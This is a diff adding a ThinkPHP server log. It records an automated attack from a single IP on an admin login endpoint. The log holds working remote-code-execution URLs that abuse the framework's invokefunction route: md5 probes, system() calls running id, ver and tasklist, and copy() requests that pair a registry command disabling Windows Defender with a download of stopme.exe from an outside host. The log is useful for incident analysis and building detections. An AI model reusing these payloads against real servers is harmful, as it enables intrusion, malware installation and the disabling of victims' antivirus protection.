@@ -1,0 +1,4405 @@
+---------------------------------------------------------------
+[ 2019-01-04T08:29:09+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.093600s][吞吐率：10.68req/s] [内存消耗：1,414.21kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\Container',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T08:29:11+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,380.38kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T08:29:13+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id [运行时间：0.187200s][吞吐率：5.34req/s] [内存消耗：1,380.25kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'id',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T08:29:14+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver [运行时间：0.171600s][吞吐率：5.83req/s] [内存消耗：1,380.27kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'ver',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T08:29:16+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist [运行时间：0.592801s][吞吐率：1.69req/s] [内存消耗：1,380.37kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'tasklist',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T08:32:20+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FNOVK9E8CZZ.exe
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FNOVK9E8CZZ.exe [运行时间：0.093600s][吞吐率：10.68req/s] [内存消耗：1,417.98kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/NOVK9E8CZZ.exe',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T08:32:23+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FNOVK9E8CZZ.exe%22);
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FNOVK9E8CZZ.exe%22); [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,418.06kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/NOVK9E8CZZ.exe");',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.015600s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T08:56:24+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,414.22kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\Container',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T08:56:27+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,380.38kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.015600s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T08:56:29+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id [运行时间：0.187200s][吞吐率：5.34req/s] [内存消耗：1,380.25kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'id',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T08:56:31+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver [运行时间：0.156000s][吞吐率：6.41req/s] [内存消耗：1,380.27kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'ver',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T08:56:32+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist [运行时间：0.436801s][吞吐率：2.29req/s] [内存消耗：1,380.37kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'tasklist',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T08:59:37+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FKI2PV72FYF.exe
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FKI2PV72FYF.exe [运行时间：0.093601s][吞吐率：10.68req/s] [内存消耗：1,417.98kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/KI2PV72FYF.exe',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T08:59:39+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FKI2PV72FYF.exe%22);
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FKI2PV72FYF.exe%22); [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,418.06kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
